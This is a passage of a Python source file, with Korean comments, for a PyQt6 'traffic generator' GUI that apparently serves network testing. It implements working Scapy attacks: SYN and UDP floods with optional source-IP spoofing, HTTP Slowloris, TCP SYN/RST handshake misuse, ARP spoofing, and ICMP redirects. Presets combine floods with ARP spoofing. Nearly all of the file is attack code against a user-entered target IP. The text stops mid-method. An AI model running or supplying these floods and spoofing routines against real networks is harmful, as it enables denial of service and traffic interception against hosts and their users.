# 필요한 모듈을 임포트.
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox, QProgressBar, QTextEdit
from PyQt6.QtGui import QIcon
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
from scapy.all import IP, TCP, UDP, send, sr1, ICMP, Ether, ARP, conf, Raw
import threading
import socket
import random
from multiprocessing import Process, Value
import subprocess
import ctypes
import sys
import os
import json
import time
import struct
import gc

# 모듈 경로를 부모 디렉토리로 설정하기 위한 코드 추가
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)  # components 디렉토리의 부모 (scripts)
sys.path.append(parent_dir)

# Scapy 설정 (Wireshark에서 캡처가 잘 되도록)
conf.verb = 0  # 상세 출력 비활성화

# 최대 패킷 캐시 크기 제한 (메모리 최적화) - 크기를 더 줄임
MAX_PACKET_CACHE_SIZE = 200  # 1000에서 200으로 감소
PACKET_BATCH_SIZE = 50       # 배치 크기를 더 작게

# SYN 플러드 공격을 수행하는 함수.
def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return
    
    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"SYN 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
    packets = []
    sent_count = 0
    
    for i in range(packet_count):
        if stop_flag.is_set():
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
        packets.append(packet)
        
        # 배치 크기마다 전송 (메모리 부담 감소)
        if len(packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                sent_count += len(packets)
                
                # 진행률 콜백 호출
                if progress_callback:
                    progress = int((i + 1) / packet_count * 100)
                    progress_callback.emit(f"SYN 플러드 진행률: {progress}% ({sent_count}/{packet_count})")
                
                # 로그 출력 빈도 감소 (매 500개마다)
                if sent_count % 500 == 0 or i == packet_count-1:
                    print(f'{sent_count}개 SYN 패킷 전송 완료 ({i+1}/{packet_count})')
                
                packets.clear()  # packets = [] 대신 clear() 사용하여 메모리 재사용
                
                # 중간에 잠시 대기하여 시스템 부하 감소
                if i < packet_count - 1:
                    time.sleep(0.001)  # 1ms 대기
                    
            except Exception as e:
                print(f'패킷 전송 중 오류: {str(e)}')
                packets.clear()  # 오류 발생해도 메모리 정리
                # 오류 발생 시 잠시 대기
                time.sleep(0.01)
    
    # 메모리 정리
    del packets
    gc.collect()
    print(f"SYN 플러드 완료 - 총 {sent_count}개 패킷 전송")

# UDP 플러드 공격을 수행하는 함수.
def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return
    
    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"UDP 플러드 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송 (빠른 전송을 위함)
    packets = []
    sent_count = 0
    
    for i in range(packet_count):
        if stop_flag.is_set():
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 8 - 14)  # IP(20) + UDP(8) + Ethernet(14)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/UDP(sport=sport, dport=dport)/Raw(load='X'*payload_size)
        packets.append(packet)
        
        # 배치 크기마다 전송 (메모리 부담 감소)
        if len(packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                sent_count += len(packets)
                
                # 진행률 콜백 호출
                if progress_callback:
                    progress = int((i + 1) / packet_count * 100)
                    progress_callback.emit(f"UDP 플러드 진행률: {progress}% ({sent_count}/{packet_count})")
                
                # 로그 출력 빈도 감소 (매 500개마다)
                if sent_count % 500 == 0 or i == packet_count-1:
                    print(f'{sent_count}개 UDP 패킷 전송 완료 ({i+1}/{packet_count})')
                
                packets.clear()  # 메모리 재사용
                
                # 중간에 잠시 대기하여 시스템 부하 감소
                if i < packet_count - 1:
                    time.sleep(0.001)  # 1ms 대기
                    
            except Exception as e:
                print(f'패킷 전송 중 오류: {str(e)}')
                packets.clear()  # 오류 발생해도 메모리 정리
                # 오류 발생 시 잠시 대기
                time.sleep(0.01)
    
    # 메모리 정리
    del packets
    gc.collect()
    print(f"UDP 플러드 완료 - 총 {sent_count}개 패킷 전송")

# HTTP Slowloris 공격을 수행하는 함수
def http_slowloris(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"HTTP Slowloris 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # HTTP 요청 헤더 생성
    http_headers_template = [
        "GET / HTTP/1.1",
        f"Host: {target_ip}",
        "User-Agent: Mozilla/5.0",
        "Accept: text/html",
        "Connection: keep-alive"
    ]
    
    # 패킷을 리스트에 모아서 한 번에 전송
    packets = []
    for i in range(packet_count):
        if stop_flag.is_set():
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        
        # 부분적인 HTTP 요청 생성 (완료되지 않는 요청)
        headers = http_headers_template.copy()
        # 패킷마다 다른 헤더 추가 (완료되지 않게)
        headers.append(f"X-Header-{i}: {'X' * min(50, i % 100)}")
        http_payload = "\r\n".join(headers)
        
        # 패킷 생성
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=80, flags='PA')/Raw(load=http_payload)
        packets.append(packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
            try:
                send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(packets)}개 HTTP Slowloris 패킷 전송 ({i+1}/{packet_count})', shell=True)
                packets.clear()  # 메모리 재사용
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
                packets.clear()  # 오류 발생해도 메모리 정리
    
    # 메모리 정리
    del packets
    gc.collect()

# TCP 핸드셰이크 오용 공격을 수행하는 함수.
def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    # IP 스푸핑이 활성화된 경우 소스 IP 변경
    if spoof_ip and is_valid_ip(spoof_ip):
        src_ip = spoof_ip
        print(f"IP 스푸핑 활성화: {spoof_ip}")

    print(f"TCP 핸드셰이크 오용 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 패킷 수: {packet_count}")
    
    # 패킷을 리스트에 모아서 한 번에 전송
    syn_packets = []
    rst_packets = []
    
    for i in range(packet_count):
        if stop_flag.is_set():
            break
        
        sport = random.randint(1024, 65535)  # 소스 포트를 랜덤으로 생성
        dport = random.randint(1, 65535)     # 목적지 포트도 랜덤
        payload_size = max(0, packet_size - 20 - 20 - 14)  # IP(20) + TCP(20) + Ethernet(14)
        
        # SYN 패킷 생성
        syn_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
        syn_packets.append(syn_packet)
        
        # RST 패킷 생성 (핸드셰이크 중단)
        rst_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='R')
        rst_packets.append(rst_packet)
        
        # 일정 개수마다 전송 (메모리 부담 감소)
        if len(syn_packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
            try:
                # SYN 패킷 전송
                send(syn_packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(syn_packets)}개 TCP SYN 패킷 전송 ({i+1}/{packet_count})', shell=True)
                
                # 약간의 지연 후 RST 패킷 전송
                time.sleep(0.01)
                send(rst_packets, iface=iface, verbose=0, inter=0, realtime=False)
                subprocess.run(f'echo {len(rst_packets)}개 TCP RST 패킷 전송 ({i+1}/{packet_count})', shell=True)
                
                # 패킷 리스트 초기화
                syn_packets.clear()
                rst_packets.clear()
            except Exception as e:
                subprocess.run(f'echo 패킷 전송 중 오류: {str(e)}', shell=True)
                syn_packets.clear()
                rst_packets.clear()
    
    # 메모리 정리
    del syn_packets
    del rst_packets
    gc.collect()

# SSL/TLS 트래픽을 생성하는 함수.
def ssl_traffic(target_ip, count, packet_size, stop_flag):
    import ssl
    import socket
    for _ in range(count):
        if stop_flag.is_set():
            break
        context = ssl.create_default_context()
        with socket.create_connection((target_ip, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                data_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
                data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                ssock.sendall(data)
                subprocess.run(f'echo SSL/TLS packet sent to {target_ip}:443', shell=True)

# HTTP 요청을 변조하는 함수.
def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
    import requests
    for _ in range(packet_count):
        if stop_flag.is_set():
            break
        headers = {'User-Agent': 'ModifiedUserAgent'}
        try:
            requests.get(f'http://{target_ip}', headers=headers)
            subprocess.run(f'echo HTTP request sent to {target_ip}', shell=True)
        except requests.exceptions.RequestException:
            pass

# ARP 스푸핑 공격을 수행하는 함수.
def arp_spoof(target_ip, spoof_ip, stop_flag):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    print(f"ARP 스푸핑 시작 - 인터페이스: {iface}, 소스 IP: {src_ip}, 스푸핑 IP: {spoof_ip}")
    
    # 타겟의 MAC 주소 획득 시도
    target_mac = None
    try:
        # ARP 요청을 보내 MAC 주소 확인 시도
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
        response = sr1(arp_request, timeout=1, verbose=0, iface=iface)
        if response:
            target_mac = response.hwsrc
        else:
            target_mac = "ff:ff:ff:ff:ff:ff"  # 찾지 못한 경우 브로드캐스트 MAC 사용
    except Exception as e:
        print(f"타겟 MAC 주소 확인 중 오류: {str(e)}")
        target_mac = "ff:ff:ff:ff:ff:ff"  # 오류 발생 시 브로드캐스트 MAC 사용
    
    # ARP 스푸핑 패킷 생성 (여러 개를 미리 생성)
    arp_packets = []
    for i in range(100):  # 100개의 패킷을 미리 생성
        arp_response = ARP(op="is-at", 
                          psrc=spoof_ip,  # 스푸핑할 IP (대개 게이트웨이)
                          pdst=target_ip,  # 타겟 IP
                          hwdst=target_mac,  # 타겟 MAC
                          hwsrc=Ether().src)  # 자신의 MAC
        arp_packets.append(arp_response)
    
    # 패킷 카운터
    count = 0
    max_iterations = 1000  # 최대 반복 횟수 제한
    iteration = 0
    
    # 제한된 스푸핑 시작
    while not stop_flag.is_set() and iteration < max_iterations:
        try:
            # 미리 생성한 패킷들을 빠르게 전송
            send(arp_packets, iface=iface, verbose=0, inter=0)
            count += len(arp_packets)
            # 로그 출력 빈도 감소 (매 10번째 반복마다)
            if iteration % 10 == 0:
                print(f'ARP 스푸핑 패킷 {count}개 전송됨')
            
            # 약간의 지연 (ARP 캐시 갱신 주기보다 짧게)
            time.sleep(0.5)
            iteration += 1
        except Exception as e:
            print(f'ARP 패킷 전송 중 오류: {str(e)}')
            time.sleep(1.0)  # 오류 발생 시 좀 더 긴 지연
    
    print(f"ARP 스푸핑 완료 - 총 {count}개 패킷 전송")

# ICMP 리다이렉트 공격을 수행하는 함수.
def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
    # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
    iface, src_ip = get_default_iface_and_ip()
    if not iface:
        print(f"네트워크 인터페이스를 찾을 수 없습니다.")
        return

    print(f"사용 인터페이스: {iface}, 소스 IP: {src_ip}")
    
    # 원래 게이트웨이 IP 확인 (실제 게이트웨이 주소를 사용하도록)
    gateway_ip = get_default_gateway() or "192.168.1.1"
    
    count = 0
    max_iterations = 100  # 최대 반복 횟수 제한
    
    while not stop_flag.is_set() and count < max_iterations:
        count += 1
        try:
            # Scapy를 사용하여 ICMP 리다이렉트 패킷 생성
            redirect_packet = IP(src=gateway_ip, dst=target_ip)/ICMP(
                type=5,  # 리다이렉트
                code=1,  # 호스트에 대한 리다이렉트
                gw=new_gateway_ip)/IP(src=target_ip, dst="8.8.8.8")
            
            # 패킷 전송
            send(redirect_packet, iface=iface, verbose=0)
            # 로그 출력 빈도 감소 (매 10번째 패킷마다)
            if count % 10 == 0:
                print(f'ICMP redirect packet #{count} sent to {target_ip} (new gateway: {new_gateway_ip})')
            
            # 리다이렉트도 주기적으로 반복
            time.sleep(1.0)
            
        except Exception as e:
            print(f'Error sending ICMP redirect packet: {str(e)}')
            time.sleep(1.0)  # 오류 발생 시 더 긴 지연
    
    print(f"ICMP 리다이렉트 완료 - 총 {count}개 패킷 전송")

# 네트워크 인터페이스와 IP 가져오는 유틸리티 함수
def get_default_iface_and_ip():
    """기본 네트워크 인터페이스와 IP 주소를 가져옵니다."""
    try:
        # Windows에서 기본 네트워크 인터페이스 찾기
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # Google DNS에 연결하여 사용 중인 인터페이스/IP 확인
            s.connect(("8.8.8.8", 80))
            src_ip = s.getsockname()[0]
            s.close()
            
            # Scapy의 conf.iface 사용
            iface = conf.iface
            
            # 인터페이스가 None이거나 비어있는 경우 처리
            if not iface:
                # Windows의 경우 기본 인터페이스 찾기
                import psutil
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET and addr.address == src_ip:
                            iface = interface
                            break
                    if iface:
                        break
            
            print(f"Scapy 기본 인터페이스: {iface}, IP: {src_ip}")
            return iface, src_ip
            
        except socket.error as e:
            print(f"네트워크 연결을 확인할 수 없습니다: {e}")
            s.close()
    except Exception as e:
        print(f"인터페이스 확인 중 오류: {str(e)}")
    
    # 실패 시 localhost로 폴백
    return conf.loopback_name or "lo", "127.0.0.1"

# 기본 게이트웨이 주소를 확인하는 함수
def get_default_gateway():
    """기본 게이트웨이 주소를 가져옵니다."""
    try:
        # Scapy에서 기본 라우트 정보 가져오기
        for net, msk, gw, iface, addr, metric in conf.route.routes:
            if net == 0 and msk == 0:  # 기본 라우트
                return gw
    except Exception as e:
        print(f"게이트웨이 확인 중 오류: {e}")
    
    # 실패 시 일반적인 게이트웨이 주소 반환
    return "192.168.1.1"

# IP 주소의 유효성을 검사하는 함수
def is_valid_ip(ip):
    """IP 주소 유효성 검사 (IPv4 및 IPv6 지원)"""
    try:
        # IPv4 검사
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        try:
            # IPv6 검사
            socket.inet_pton(socket.AF_INET6, ip)
            return True
        except socket.error:
            return False

def test_packet_send(target_ip="127.0.0.1", method="scapy"):
    """패킷 전송 테스트 함수"""
    print(f"패킷 전송 테스트 시작 ({method} 사용)")
    
    try:
        if method == "socket":
            # 일반 소켓 사용
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"TEST", (target_ip, 12345))
            s.close()
            print("소켓 테스트 완료")
            return True
            
        elif method == "scapy":
            # Scapy 사용
            iface = conf.iface  # Scapy 기본 인터페이스 사용
            print(f"Scapy 사용 인터페이스: {iface}")
            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
            print("Scapy 테스트 완료")
            return True
    except Exception as e:
        print(f"패킷 전송 테스트 오류: {str(e)}")
        return False



# 트래픽 생성 스레드 클래스
class TrafficGeneratorThread(QThread):
    """트래픽 생성을 위한 별도 스레드"""
    progress = pyqtSignal(str)  # 진행 상황 시그널
    finished = pyqtSignal(str)  # 완료 시그널
    error = pyqtSignal(str)     # 오류 시그널
    
    def __init__(self, attack_func, args, attack_name="Unknown"):
        super().__init__()
        self.attack_func = attack_func
        self.args = args
        self.attack_name = attack_name
        self.stop_flag = threading.Event()
        self.is_stopped = False
        
    def run(self):
        """스레드 실행"""
        try:
            # stop_flag를 args에 추가 (None을 찾아서 대체)
            args_with_flag = list(self.args)
            
            # None을 stop_flag로 대체하고 progress_callback 추가
            for i in range(len(args_with_flag)):
                if args_with_flag[i] is None:
                    args_with_flag[i] = self.stop_flag
                    break
            
            # progress_callback 추가 (함수가 지원하는 경우)
            if self.attack_name in ["SYN 플러드", "UDP 플러드"]:
                args_with_flag.append(self.progress)
            
            self.progress.emit(f"{self.attack_name} 시작...")
            self.attack_func(*args_with_flag)
            
            if not self.is_stopped:
                self.finished.emit(f"{self.attack_name} 완료")
        except Exception as e:
            if not self.is_stopped:
                self.error.emit(f"{self.attack_name} 오류: {str(e)}")
            print(f"트래픽 생성 오류 상세: {e}")
            import traceback
            traceback.print_exc()
    
    def stop(self):
        """스레드 중지"""
        self.is_stopped = True
        self.stop_flag.set()
        
        # 스레드가 종료될 때까지 최대 5초 대기
        if not self.wait(5000):  # 3초에서 5초로 증가
            print(f"Warning: {self.attack_name} 스레드가 정상 종료되지 않아 강제 종료합니다.")
            self.terminate()
            self.wait(1000)  # 강제 종료 후 1초 대기

# 트래픽 생성기 애플리케이션 클래스.
class TrafficGeneratorApp(QWidget):
    def __init__(self, main_app, parent=None):
        super().__init__(parent)
        self.main_app = main_app  # MainApp 인스턴스를 저장
        
        # 관리자 권한 상태 확인
        admin_status = ""
        if hasattr(self.main_app, 'is_admin_mode') and self.main_app.is_admin_mode:
            admin_status = " [관리자]"
        
        self.setWindowTitle("트래픽 생성기" + admin_status)
        layout = QVBoxLayout()

        # 상단 레이아웃 설정
        top_layout = QHBoxLayout()

        # 뒤로가기 버튼을 설정.
        back_button = QPushButton("")
        back_button.setIcon(QIcon.fromTheme("go-previous"))  # 아이콘 설정
        back_button.setFixedSize(30, 30)  # 다른 어플리케이션과 동일한 크기
        back_button.clicked.connect(self.go_back)  # 뒤로가기 기능 연결
        top_layout.addWidget(back_button)

        # IP 입력 필드를 설정.
        ip_label = QLabel("대상 IP:")
        self.ip_input = QLineEdit()
        # 기본값으로 localhost 설정 (테스트 용도)
        self.ip_input.setText("127.0.0.1")
        top_layout.addWidget(ip_label)
        top_layout.addWidget(self.ip_input)

        layout.addLayout(top_layout)

        # IP 스푸핑 설정 추가
        spoof_layout = QHBoxLayout()
        self.spoof_ip_checkbox = QCheckBox("IP 스푸핑 사용")
        self.spoof_ip_input = QLineEdit()
        self.spoof_ip_input.setPlaceholderText("스푸핑할 소스 IP 주소 입력")
        self.spoof_ip_input.setEnabled(False)
        self.spoof_ip_checkbox.stateChanged.connect(self.toggle_spoof_ip)
        spoof_layout.addWidget(self.spoof_ip_checkbox)
        spoof_layout.addWidget(self.spoof_ip_input)
        layout.addLayout(spoof_layout)
        
        # 패킷 전송 테스트 버튼 추가
        test_layout = QHBoxLayout()
        test_button = QPushButton("패킷 전송 테스트")
        test_button.clicked.connect(self.test_packet_transmission)
        test_layout.addWidget(test_button)
        layout.addLayout(test_layout)

        # 기본 프리셋 추가
        self.presets = {
            "SYN 플러드 + ARP 스푸핑": {
                "syn_flood": True,
                "arp_spoofing": True
            },
            "SYN 플러드 + ICMP 리다이렉트": {
                "syn_flood": True,
                "icmp_redirect": True
            },
            "UDP 플러드 + ARP 스푸핑": {
                "udp_flood": True,
                "arp_spoofing": True
            },
            "HTTP Slowloris + ARP 스푸핑": {
                "http_slowloris": True,
                "arp_spoofing": True
            },
            "TCP 핸드셰이크 오용 + ARP 스푸핑": {
                "tcp_handshake_misuse": True,
                "arp_spoofing": True
            },
            "SSL/TLS 트래픽 생성 + 포트 미러링": {
                "ssl_traffic": True,
                "port_mirroring": True
            },
            "HTTP 요청 변조 + ARP 스푸핑": {
                "http_request_modification": True,
                "arp_spoofing": True
            }
        }

        # 패킷 크기 선택 체크박스 추가
        packet_size_layout = QHBoxLayout()
        self.default_packet_size_checkbox = QCheckBox("기본 패킷 크기 (1514 바이트)")
        self.large_packet_size_checkbox = QCheckBox("큰 패킷 크기 (단편화 증가)")
        self.default_packet_size_checkbox.setChecked(True)  # 기본 선택
        packet_size_layout.addWidget(self.default_packet_size_checkbox)
        packet_size_layout.addWidget(self.large_packet_size_checkbox)
        layout.addLayout(packet_size_layout)

        # 체크박스 상호 배타적 설정
        self.default_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())
        self.large_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())

        # 프리셋 선택 드롭다운 추가
        preset_layout = QHBoxLayout()
        self.preset_dropdown = QComboBox()
        self.preset_dropdown.addItems(self.presets.keys())
        self.preset_dropdown.currentIndexChanged.connect(self.apply_preset)
        preset_layout.addWidget(QLabel("기본 프리셋:"))
        preset_layout.addWidget(self.preset_dropdown)
        layout.addLayout(preset_layout)

        # 1번 선택군과 2번 선택군을 나란히 배치
        attack_group_layout = QHBoxLayout()

        # 1번 선택군 체크박스 설정 (트래픽 생성 관련 공격)
        group1_layout = QVBoxLayout()
        group1_label = QLabel("1번 선택군 (트래픽 생성):")
        group1_layout.addWidget(group1_label)
        self.syn_flood_checkbox = QCheckBox("SYN 플러드")
        self.udp_flood_checkbox = QCheckBox("UDP 플러드")
        self.http_slowloris_checkbox = QCheckBox("HTTP Slowloris")
        self.tcp_handshake_misuse_checkbox = QCheckBox("TCP 핸드셰이크 오용")
        self.ssl_traffic_checkbox = QCheckBox("SSL/TLS 트래픽")
        self.http_request_modification_checkbox = QCheckBox("HTTP 요청 변조")
        group1_layout.addWidget(self.syn_flood_checkbox)
        group1_layout.addWidget(self.udp_flood_checkbox)
        group1_layout.addWidget(self.http_slowloris_checkbox)
        group1_layout.addWidget(self.tcp_handshake_misuse_checkbox)
        group1_layout.addWidget(self.ssl_traffic_checkbox)
        group1_layout.addWidget(self.http_request_modification_checkbox)

        # 2번 선택군 체크박스 설정 (네트워크 조작 관련 공격)
        group2_layout = QVBoxLayout()
        group2_label = QLabel("2번 선택군 (네트워크 조작):")
        group2_layout.addWidget(group2_label)
        self.arp_spoofing_checkbox = QCheckBox("ARP 스푸핑")
        self.icmp_redirect_checkbox = QCheckBox("ICMP 리다이렉트")
        self.port_mirroring_checkbox = QCheckBox("포트 미러링")
        group2_layout.addWidget(self.arp_spoofing_checkbox)
        group2_layout.addWidget(self.icmp_redirect_checkbox)
        group2_layout.addWidget(self.port_mirroring_checkbox)

        # 각 그룹의 요소들을 정렬하여 깔끔하게 배치
        group1_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        group2_layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        attack_group_layout.addLayout(group1_layout)
        attack_group_layout.addLayout(group2_layout)
        layout.addLayout(attack_group_layout)

        # 패킷 수 입력 필드를 설정.
        packet_count_layout = QHBoxLayout()
        packet_count_label = QLabel("패킷 수:")
        self.packet_count_input = QLineEdit("10")
        
        # 안전성을 위한 경고 라벨 추가
        warning_label = QLabel("⚠️ 권장: 1000개 이하 (메모리 부족 방지)")
        warning_label.setStyleSheet("color: orange; font-size: 10px;")
        
        packet_count_layout.addWidget(packet_count_label)
        packet_count_layout.addWidget(self.packet_count_input)
        packet_count_layout.addWidget(warning_label)
        layout.addLayout(packet_count_layout)

        # 진행률 표시 추가
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)  # 초기에는 숨김
        layout.addWidget(self.progress_bar)
        
        # 상태 표시 라벨 추가
        self.status_label = QLabel("대기 중...")
        self.status_label.setStyleSheet("color: blue; font-weight: bold;")
        layout.addWidget(self.status_label)

        # 패킷 생성 버튼을 설정.
        self.generate_button = QPushButton("패킷 생성 및 전송")
        self.generate_button.clicked.connect(self.generate_traffic)
        layout.addWidget(self.generate_button)

        # 전송 중단 버튼을 설정.
        self.stop_button = QPushButton("전송 중단")
        self.stop_button.clicked.connect(self.stop_transmission)
        self.stop_button.setEnabled(False)  # 초기에는 비활성화
        layout.addWidget(self.stop_button)
        
        # 로그 출력 창 추가
        log_label = QLabel("실행 로그:")
        layout.addWidget(log_label)
        
        self.log_output = QTextEdit()
        self.log_output.setMaximumHeight(100)  # 높이 제한
        self.log_output.setReadOnly(True)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

        # 스레드 추적을 위한 리스트를 초기화.
        self.attack_threads = []
        
        # 주기적 메모리 정리를 위한 타이머
        self.gc_timer = QTimer(self)
        self.gc_timer.timeout.connect(self.clean_memory)
        self.gc_timer.start(300000)  # 1분에서 5분으로 변경하여 부하 감소
        
        # 초기 상태 메시지 출력
        if hasattr(self.main_app, 'is_admin_mode'):
            if self.main_app.is_admin_mode:
                self.add_log("✅ 관리자 권한으로 실행 중입니다.")
            else:
                self.add_log("⚠️ 제한된 권한으로 실행 중입니다. 일부 기능이 제한될 수 있습니다.")

    # 메인 화면으로 돌아가는 메서드.
    def go_back(self):
        # MainApp의 show_main_screen 메서드를 호출
        self.main_app.show_main_screen()

    # 트래픽을 생성하고 전송하는 메서드.
    def generate_traffic(self):
        """사용자 입력을 받아 트래픽을 생성합니다."""
        # 관리자 권한 확인 - 부모 애플리케이션에서 이미 처리됨
        # 부모 애플리케이션이 관리자 권한 상태를 가지고 있는지 확인
        if hasattr(self.main_app, 'is_admin_mode'):
            if not self.main_app.is_admin_mode and os.name == 'nt':
                self.add_log("⚠️ 경고: 관리자 권한이 없어 일부 기능이 제한될 수 있습니다.")
                # 권한이 없어도 계속 진행 (일부 기능만 제한)
        
        # 유효성 검사
        target_ip = self.ip_input.text().strip()
        if not self.is_valid_ip(target_ip):
            QMessageBox.warning(self, '입력 오류', '유효한 IP 주소를 입력하세요.')
            return
        
        try:
            packet_count = int(self.packet_count_input.text().strip())
            if packet_count <= 0:
                raise ValueError("패킷 수는 0보다 커야 합니다.")
            
            # 안전성을 위한 패킷 수 제한
            if packet_count > 10000:
                reply = QMessageBox.question(
                    self, '대량 패킷 경고',
                    f'패킷 {packet_count}개는 시스템에 부하를 줄 수 있습니다.\n'
                    f'계속 진행하시겠습니까? (권장: 1000개 이하)',
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )
                if reply == QMessageBox.StandardButton.No:
                    return
                    
        except ValueError as e:
            QMessageBox.warning(self, '입력 오류', f'유효한 패킷 수를 입력하세요: {str(e)}')
            return
        
        # 메모리 사용량 체크
        try:
            import psutil
            memory_percent = psutil.virtual_memory().percent
            if memory_percent > 80:
                reply = QMessageBox.question(
                    self, '메모리 부족 경고',
                    f'현재 메모리 사용률이 {memory_percent:.1f}%입니다.\n'
                    f'트래픽 생성을 계속하시겠습니까?',
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )
                if reply == QMessageBox.StandardButton.No:
                    return
        except ImportError:
            self.add_log("경고: psutil이 없어 메모리 확인을 건너뜁니다.")
        
        # 패킷 크기 설정
        packet_size = self.get_packet_size()
        
        # IP 스푸핑 설정
        spoof_ip = None
        if self.spoof_ip_checkbox.isChecked():
            spoof_ip = self.spoof_ip_input.text().strip()
            if not self.is_valid_ip(spoof_ip):
                QMessageBox.warning(self, '입력 오류', '유효한 스푸핑 IP 주소를 입력하세요.')
                return
        
        # 선택된 공격 유형 확인
        selected_attacks = []
        
        # 1번 선택군 (트래픽 생성) 확인
        if self.syn_flood_checkbox.isChecked():
            selected_attacks.append(('SYN 플러드', syn_flood, (target_ip, packet_count, packet_size, None, spoof_ip)))
        if self.udp_flood_checkbox.isChecked():
            selected_attacks.append(('UDP 플러드', udp_flood, (target_ip, packet_count, packet_size, None, spoof_ip)))
        if self.http_slowloris_checkbox.isChecked():
            selected_attacks.append(('HTTP Slowloris', http_slowloris, (target_ip, packet_count, packet_size, None, spoof_ip)))
        if self.tcp_handshake_misuse_checkbox.isChecked():
            selected_attacks.append(('TCP 핸드셰이크 오용', tcp_handshake_misuse, (target_ip, packet_count, packet_size, None, spoof_ip)))
        if self.ssl_traffic_checkbox.isChecked():
